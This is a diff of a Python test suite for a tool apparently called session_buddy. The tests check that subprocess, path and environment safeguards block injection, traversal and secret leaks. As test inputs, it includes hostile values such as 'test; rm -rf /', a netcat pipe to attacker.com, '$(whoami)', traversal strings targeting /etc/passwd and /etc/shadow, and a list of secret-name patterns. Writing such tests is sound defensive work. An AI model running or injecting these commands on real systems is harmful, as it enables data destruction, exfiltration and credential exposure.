@@ -13,16 +13,23 @@ Author: Test Coverage Review Specialist
 Date: 2025-02-02
 """
 
-import pytest
 import os
 import tempfile
 import threading
 import time
 from pathlib import Path
+
+import pytest
+
 from session_buddy.mcp.tools.session.crackerjack_tools import _parse_crackerjack_args
-from session_buddy.utils.subprocess_helper import SafeSubprocess, _get_safe_environment
-from session_buddy.utils.path_validation import PathValidator, validate_working_directory
 from session_buddy.utils.git_operations import _validate_prune_delay
+from session_buddy.utils.path_validation import (
+    PathValidator,
+)
+from session_buddy.utils.subprocess_executor import (
+    SafeSubprocess,
+    _get_safe_environment,
+)
 
 # =============================================================================
 # PRIORITY 1 - CRITICAL (Implement Before Phase 2)
@@ -31,6 +38,7 @@ from session_buddy.utils.git_operations import _validate_prune_delay
 # -----------------------------------------------------------------------------
 # Command Injection Prevention - Priority 1 Tests
 # -----------------------------------------------------------------------------
+
 
 def test_parse_crackerjack_args_newline_injection():
     """Test newline characters are blocked in arguments.
@@ -103,6 +111,7 @@ def test_parse_crackerjack_args_argument_overflow():
 # Subprocess Safety - Priority 1 Tests
 # -----------------------------------------------------------------------------
 
+
 def test_run_safe_empty_command():
     """Test empty commands are rejected.
 
@@ -133,24 +142,17 @@ def test_run_safe_argument_injection():
     """
     # Semicolon injection
     with pytest.raises(ValueError, match="Shell metacharacter"):
-        SafeSubprocess.run_safe(
-            ["echo", "test; rm -rf /"],
-            allowed_commands={"echo"}
-        )
+        SafeSubprocess.run_safe(["echo", "test; rm -rf /"], allowed_commands={"echo"})
 
     # Pipe injection
     with pytest.raises(ValueError, match="Shell metacharacter"):
         SafeSubprocess.run_safe(
-            ["echo", "test | nc attacker.com 4444"],
-            allowed_commands={"echo"}
+            ["echo", "test | nc attacker.com 4444"], allowed_commands={"echo"}
         )
 
     # Command substitution
     with pytest.raises(ValueError, match="Shell metacharacter"):
-        SafeSubprocess.run_safe(
-            ["echo", "$(whoami)"],
-            allowed_commands={"echo"}
-        )
+        SafeSubprocess.run_safe(["echo", "$(whoami)"], allowed_commands={"echo"})
 
 
 def test_run_safe_absolute_path_blocked():
@@ -165,17 +167,11 @@ def test_run_safe_absolute_path_blocked():
     """
     # Absolute path to allowed command
     with pytest.raises(ValueError, match="Command not allowed"):
-        SafeSubprocess.run_safe(
-            ["/bin/echo", "test"],
-            allowed_commands={"echo"}
-        )
+        SafeSubprocess.run_safe(["/bin/echo", "test"], allowed_commands={"echo"})
 
     # Relative path with ./
     with pytest.raises(ValueError, match="Command not allowed"):
-        SafeSubprocess.run_safe(
-            ["./echo", "test"],
-            allowed_commands={"echo"}
-        )
+        SafeSubprocess.run_safe(["./echo", "test"], allowed_commands={"echo"})
 
 
 def test_run_safe_concurrent_sanitization():
@@ -194,12 +190,13 @@ def test_run_safe_concurrent_sanitization():
 
     def run_command_with_secret():
         """Add secret and run command concurrently."""
-        os.environ[f"SECRET_{threading.get_ident()}"] = f"secret_{threading.get_ident()}"
+        os.environ[f"SECRET_{threading.get_ident()}"] = (
+            f"secret_{threading.get_ident()}"
+        )
 
         try:
             result = SafeSubprocess.run_safe(
-                ["echo", "test"],
-                allowed_commands={"echo"}
+                ["echo", "test"], allowed_commands={"echo"}
             )
             results.append(result)
 
@@ -228,6 +225,7 @@ def test_run_safe_concurrent_sanitization():
 # -----------------------------------------------------------------------------
 # Path Validation - Priority 1 Tests
 # -----------------------------------------------------------------------------
+
 
 def test_validate_user_path_null_byte_blocked():
     """Test null bytes in paths are blocked.
@@ -305,10 +303,7 @@ def test_validate_user_path_symlink_attack():
 
             # Should block access through symlink
             with pytest.raises(ValueError, match="escapes base directory"):
-                validator.validate_user_path(
-                    safe_link / "passwd",
-                    base_dir=tmpdir
-                )
+                validator.validate_user_path(safe_link / "passwd", base_dir=tmpdir)
 
         finally:
             # Cleanup
@@ -323,6 +318,7 @@ def test_validate_user_path_symlink_attack():
 # -----------------------------------------------------------------------------
 # Command Injection Prevention - Priority 2 Tests
 # -----------------------------------------------------------------------------
+
 
 def test_parse_crackerjack_args_unicode_homograph():
     """Test Unicode look-alike characters are blocked.
@@ -409,6 +405,7 @@ def test_parse_crackerjack_args_flag_repetition():
 # Subprocess Safety - Priority 2 Tests
 # -----------------------------------------------------------------------------
 
+
 def test_run_safe_large_output():
     """Test large subprocess output is handled correctly.
 
@@ -419,8 +416,7 @@ def test_run_safe_large_output():
     """
     # Generate 10MB of output
     result = SafeSubprocess.run_safe(
-        ["python", "-c", "print('A' * 10_000_000)"],
-        allowed_commands={"python"}
+        ["python", "-c", "print('A' * 10_000_000)"], allowed_commands={"python"}
     )
 
     # Should succeed without hanging
@@ -431,6 +427,7 @@ def test_run_safe_large_output():
 # -----------------------------------------------------------------------------
 # Path Validation - Priority 2 Tests
 # -----------------------------------------------------------------------------
+
 
 def test_validate_user_path_toctou():
     """Test TOCTOU vulnerability is mitigated.
@@ -502,6 +499,7 @@ def test_validate_user_path_mixed_separators():
 # Environment Sanitization - Priority 2 Tests
 # -----------------------------------------------------------------------------
 
+
 def test_environment_sanitization_edge_cases():
     """Test edge case variable names are handled correctly.
 
@@ -559,6 +557,7 @@ def test_environment_sanitization_special_values():
 # Git Security - Priority 2 Tests
 # -----------------------------------------------------------------------------
 
+
 def test_prune_delay_command_injection():
     """Test command injection attempts are blocked in prune delay.
 
@@ -602,7 +601,7 @@ def test_prune_delay_invalid_time_units():
     invalid_units = [
         "2.centuries",
         "1.millenniums",
-        "5.lightyears",
+        "5.light years",
         "1.decades",  # Not a git time unit
         "1.fortnights",
     ]
@@ -634,6 +633,7 @@ def test_prune_delay_floating_point():
 # =============================================================================
 # PRIORITY 3 - MEDIUM (Implement for Comprehensive Coverage)
 # =============================================================================
+
 
 def test_parse_crackerjack_args_url_like_strings():
     """Test URL-like strings are handled correctly.
@@ -715,6 +715,7 @@ def test_environment_sanitization_large_values():
 # HELPER FUNCTIONS
 # =============================================================================
 
+
 def setup_sensitive_env():
     """Set up sensitive environment variables for testing."""
     os.environ["TEST_PASSWORD"] = "secret123"
@@ -744,11 +745,9 @@ INJECTION_STRINGS = [
     "\n malicious",
     "\r\n malicious",
     "\t malicious",
-
     # Unicode attacks
     "－verbose",  # Full-width dash
     "ｓｔａｔｕｓ",  # Full-width letters
-
     # Overflow
     "A" * 100000,
     "A" * 1000000,
@@ -760,31 +759,38 @@ PATH_TRAVERSAL_STRINGS = [
     "../etc/passwd",
     "..\\..\\..\\windows\\system32",
     "../../../../../etc/shadow",
-
     # Null bytes
     "/etc/passwd\x00.txt",
     "safe\x00../../etc/passwd",
-
     # Overflow
     "/tmp/" + "a" * 5000,
-
     # Mixed separators
     "../..\\etc",
     "..\\../etc",
-
     # Symlinks
     "/tmp/symlink_to_etc",
 ]
 
 # Environment Variable Test Data
 SENSITIVE_PATTERNS = [
-    "PASSWORD", "TOKEN", "SECRET", "KEY",
-    "CREDENTIAL", "API", "AUTH", "SESSION", "COOKIE",
-
+    "PASSWORD",
+    "TOKEN",
+    "SECRET",
+    "KEY",
+    "CREDENTIAL",
+    "API",
+    "AUTH",
+    "SESSION",
+    "COOKIE",
     # Edge cases
-    "_PASSWORD", "PASSWORD_", "PASSWORD_BACKUP",
-    "KEYHOLDER", "KEYCHAIN", "PASSWORD_RESET",
-
+    "_PASSWORD",
+    "PASSWORD_",
+    "PASSWORD_BACKUP",
+    "KEYHOLDER",
+    "KEYCHAIN",
+    "PASSWORD_RESET",
     # Case variations
-    "password", "Password", "PaSsWoRd",
+    "password",
+    "Password",
+    "PaSsWoRd",
 ]
